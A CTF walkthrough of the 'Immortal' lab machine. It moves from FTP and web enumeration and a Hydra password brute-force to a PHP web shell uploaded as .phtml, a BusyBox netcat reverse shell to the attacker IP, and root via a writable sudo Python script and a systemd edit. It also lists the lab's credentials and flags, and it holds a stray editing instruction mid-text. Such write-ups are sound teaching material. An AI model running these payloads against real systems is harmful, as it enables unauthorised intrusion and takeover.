+++
title = "Immortal - Walkthrough"
date = "2026-07-10"
author = "nvru"
description = "Walkthrough for the Immortal machine."
tags = [
"ctf",
"walkthrough",
"linux",
"ftp",
"file-upload",
"reverse-shell",
"sudo",
"systemd",
"privilege-escalation"
]
draft = false
+++

# Overview

- **Attacker IP:** `10.10.10.2`
- **Target Machine IP:** `10.10.10.20`

The objective was to enumerate the target, identify exposed services, gain initial access through an unrestricted file upload vulnerability, and escalate privileges by abusing writable Python code and a misconfigured `systemctl` sudo rule.

![Machine information](/images/hmv/immortal/vm.png)

---

## Discovering the Target

First, I identified the target IP address on the local network.

```bash
sudo arp-scan --interface vboxnet0 --localnet
```

Output:

```text
Interface: vboxnet0, type: EN10MB, MAC: 0a:00:27:00:00:00, IPv4: 10.10.10.2
10.10.10.20     08:00:27:13:bb:b5       PCS Systemtechnik GmbH
```

---

## Port Scanning

### RustScan

```bash
rustscan -a 10.10.10.20 -- -sC -sV -A -oA nmap/rust
```

### Results

```text
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.4p1
80/tcp open  http    Apache httpd 2.4.56
```

The machine exposed only three services: FTP, SSH, and HTTP.

---

## Enumeration

### FTP (Port 21)

Anonymous login was enabled.

![FTP](/images/hmv/immortal/ftp.png)

A single file named `message.txt` was available.

![FTP message](/images/hmv/immortal/ftp_message.png)

The message itself was not useful, but it contained a username that could be useful for later enumeration:

```text
david
```

---

### Web Enumeration

The web server was running Apache on port 80.

![HTTP](/images/hmv/immortal/http.png)

The website contained a simple password form. The application only required a password; there was no username field.

To brute-force the password using Hydra, a username parameter was still required by the `http-post-form` module. I used the previously discovered username `david` as a placeholder, although it was not validated by the application.

```bash
hydra -l david -P ~/wordlists/rockyou.txt 10.10.10.20 \
http-post-form "/index.php:password=^PASS^:Incorrect credentials" -V
```

Hydra successfully discovered the password:

```text
santiago
```

![Hydra success](/images/hmv/immortal/hydra_suc.png)

After entering the password on the website, additional directories became accessible:

```text
chat
important
tests
```

![Directory enumeration](/images/hmv/immortal/dir_web.png)

---

### File Upload Vulnerability

Inside the `chat` directory, I found several files containing messages.

![Chat directory](/images/hmv/immortal/chat.png)

While reviewing the contents, one of the files referenced an interesting page:

```text
upload_an_incredible_message.php
```

![Chat messages](/images/hmv/immortal/chat_messages.png)

Opening this page revealed a file upload functionality.

![Upload page](/images/hmv/immortal/weird_php.png)

Since the application allowed users to upload files, I tested whether it properly restricted the uploaded file types.

I first attempted to upload a simple PHP web shell:

```php
<?php
system($_GET['cmd']);
?>
```

The upload was rejected when using the `.php` extension.

I then tested several alternative PHP extensions:

```text
.php    ❌
.php5   ❌
.phtml  ✅
```

The `.phtml` extension was accepted, showing that the application was only validating the file extension. No header or MIME type modification was required.

![Successful upload](/images/hmv/immortal/suc_upload.png)

The uploaded shell was accessible from:

```text
http://10.10.10.20/longlife17/chat/
```

![Uploaded shell](/images/hmv/immortal/found_file.png)

---

## Initial Access

After bypassing the upload restriction using the `.phtml` extension, I tested the uploaded shell to confirm remote command execution.

Using `curl`, I executed a command through the uploaded file:

```bash
curl "http://10.10.10.20/longlife17/chat/<uploaded_file>.phtml?cmd=id"
```

The command executed successfully, confirming code execution on the target.

I then attempted to obtain a reverse shell. The traditional nc -e method did not work on the target system.

Since BusyBox was available, I used its implementation of nc, which supports the -e option.

Reverse shell payload:

```bash
busybox nc 10.10.10.2 9001 -e sh
```

![Payload](/images/hmv/immortal/nc_payload.png)

After starting a listener on my machine, the reverse shell was received successfully.

![Reverse shell](/images/hmv/immortal/nc_shell.png)

---

## Privilege Escalation

### www-data → drake

After getting a shell as `www-data`, I started enumerating the system for possible privilege escalation paths.

The first thing I checked was sudo permissions:

```bash
sudo -l
```

However, the command required a password, and the www-data account did not have one, so this path was not useful.

I continued with manual enumeration of user directories to look for exposed files or credentials.

The `david` home directory was inaccessible, but `drake`'s home directory contained an unusual directory literally named:

```text
...
```

![Weird directory](/images/hmv/immortal/weird_dir.png)

Inside it was a file named `pass.txt`.

![Passwords](/images/hmv/immortal/passwds_drake.png)

Contents:

```text
netflix : drake123
amazon : 123drake
shelldred : shell123dred (f4ns0nly)
system : kevcjnsgii
bank : myfavouritebank
nintendo : 123456
```

The password stored for `system` successfully authenticated as `drake`.

```bash
su drake
```

![Switch to drake](/images/hmv/immortal/su_drake.png)

---

### drake → eric

Checking sudo permissions revealed:

```bash
sudo -l
```

`drake` was allowed to execute:

```text
/opt/immortal.py
```

as user `eric`.

The Python script was writable by `drake`, making it possible to modify its contents.

I replaced the script with:

```python
import os
os.system("bash")
```

Executing the allowed command spawned a shell as `eric`.

![Eric shell](/images/hmv/immortal/su_eric.png)

---

### eric → root

While enumerating `eric`'s home directory, nothing useful was found.

![Eric home](/images/hmv/immortal/eric_home.png)

However, `sudo -l` revealed that `eric` could manage the `immortal.service` systemd unit.

Inspecting the service file revealed that it executed a command controlled by the service configuration.

![Service file](/images/hmv/immortal/unit_file.png)

Using `systemctl edit`, I modified the service to execute commands that copied `/bin/bash` to `/tmp` and assigned the SUID bit.

After starting the modified service, the SUID shell provided root access.

![Systemd exploit](/images/hmv/immortal/unit_exp.png)

![Root shell](/images/hmv/immortal/root_shell.png)

You can make it playful while keeping the walkthrough style:

## Immortality Formula

After obtaining a root shell, I checked the contents of the root directory.

Among the files, I found something that looked important:

```text
immortal_formula.txt
```

Naturally, after taking over an "immortal" machine, the first thing to do was check the secret formula.

```bash
cat immortal_formula.txt
```

Output:

```text
The formula for immortality is to live in someone else's mind.

Thank you very much for completing this machine, mortal person.

PD: Remember to eat healthy, drink plenty and sleep well.
```

Sadly, no magic immortality formula was found. It was only a small message left by the author and had nothing to do with the exploitation path or privilege escalation.

---

# Credentials

```text
Web:
password: santiago

drake:
password: kevcjnsgii
```

---

# Flags

```text
user:nothinglivesforever

root:fiNally1mMort4l
```
